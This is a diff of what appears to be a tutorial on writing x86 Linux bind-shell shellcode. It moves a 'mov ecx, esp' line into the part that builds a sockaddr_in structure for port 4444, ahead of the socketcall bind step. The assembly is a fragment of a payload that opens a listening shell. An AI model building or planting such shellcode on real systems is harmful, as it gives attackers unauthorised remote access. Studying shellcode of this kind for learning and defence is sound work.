@@ -186,6 +186,7 @@ push edx            ; padding
 push edx            ; addr.sin_addr.s_addr = INADDR_ANY = 0;
 push word 0x5c11    ; addr.sin_port = htons(4444);
 push word 0x2       ; addr.sin_family = AF_INET = 2;
+mov ecx, esp        ; pointer to struct sockaddr_in addr;
 ```
 
 #### Bind Replication using Socketcall
@@ -195,7 +196,6 @@ Call to `bind`
 ; // Bind TCP Socket to IP Socket Address Structure
 ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
 ; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
-mov ecx, esp        ; pointer to struct sockaddr_in addr;
 push 0x10           ; sizeof(addr) = 16
 push ecx            ; (struct sockaddr *)&addr
 push esi            ; int sockfd
